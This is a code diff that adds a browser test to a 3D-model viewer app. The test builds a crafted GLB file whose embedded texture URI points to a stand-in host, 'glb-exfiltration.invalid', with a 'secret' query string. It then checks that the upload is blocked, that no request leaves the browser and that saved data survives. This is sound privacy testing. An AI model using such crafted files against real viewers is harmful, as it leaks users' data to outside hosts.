@@ -46,6 +46,33 @@ try{
  evidence.clipSelectorQA={fixture:'Metal S1, not Gorillium',clipCount:evidence.baseline.clipCount,
    selectedClip:clipPreview.selectedClip,playAll:true,stop:true};
 
+ // Privacy adversary: selected GLB embeds an external texture URL. Reject BEFORE
+ // Three.js can start a request. Existing baseline must stay intact.
+ const outgoing=[];
+ page.on('request',req=>{if(req.url().includes('glb-exfiltration.invalid'))outgoing.push(req.url());});
+ const hostileJSON=new TextEncoder().encode(JSON.stringify({
+  asset:{version:'2.0'},images:[{uri:'https://glb-exfiltration.invalid/save?checkpoint=secret'}],
+  meshes:[{primitives:[]}],nodes:[]
+ }));
+ const paddedJSON=(hostileJSON.length+3)&~3;
+ const malicious=Buffer.alloc(20+paddedJSON,0x20);
+ malicious.write('glTF',0,'ascii');
+ malicious.writeUInt32LE(2,4);malicious.writeUInt32LE(malicious.length,8);
+ malicious.writeUInt32LE(paddedJSON,12);malicious.write('JSON',16,'ascii');
+ Buffer.from(hostileJSON).copy(malicious,20);
+ await page.locator('#glbUpload').setInputFiles({
+  name:'external-texture.glb',mimeType:'model/gltf-binary',buffer:malicious});
+ await page.waitForFunction(()=>document.querySelector('#status')?.textContent?.includes('EXTERNAL_RESOURCE_BLOCKED'),
+  null,{timeout:5000});
+ const stillBaseline=await page.evaluate(()=>window.__gorilliumLab.getSnapshot());
+ assert.equal(stillBaseline.source,'baseline-metal-s1','Bad upload erased the working original model');
+ assert.equal(stillBaseline.clipCount,evidence.baseline.clipCount);
+ assert.equal(outgoing.length,0,'Private GLB triggered external network requests');
+ assert.equal(await page.evaluate(()=>localStorage.getItem('wir_metal_story_v1')),'QA_SAVED_CHAPTER_KEEP');
+ evidence.privateGlbSafety={rejectedRemoteUri:true,requestsToExternalDomain:outgoing.length,
+  baselinePreserved:true,saveUnchanged:true};
+ console.log('PASS PRIVATE GLB REJECTION',JSON.stringify(evidence.privateGlbSafety));
+
  // Test local-file intake with the *existing Metal S1* as an explicit test fixture,
  // never label it as Gorillium. This verifies actual skinned-bone movement plumbing.
  await page.locator('#glbUpload').setInputFiles('connected/assets/models/metal/metal_phase6_fight.glb');
